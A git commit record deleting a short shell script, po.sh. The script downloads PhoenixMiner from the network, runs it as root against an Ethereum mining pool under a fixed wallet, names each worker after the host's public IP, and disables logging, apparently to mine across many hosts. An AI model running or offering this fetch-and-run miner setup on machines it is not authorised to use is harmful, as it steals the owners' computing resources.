a2878144a8f1fb1b9d98f824bf971315d7e4fc55
Treecommon <103907893+Treecommon@users.noreply.github.com>
2022-04-24 11:34:11 +0700

    Delete po.sh

--- po.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/sh
-sudo apt update && sudo apt install libpci3
-sudo wget https://phoenixminer.info/downloads/PhoenixMiner_6.1b_Linux.tar.gz
-tar -xf PhoenixMiner_6.1b_Linux.tar.gz
-cd PhoenixMiner_6.1b_Linux
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./PhoenixMiner -pool stratum+tcp://us-eth.2miners.com:2020 -wal 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4.$ip -epsw x -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 89 -asm 2 -allpools 1
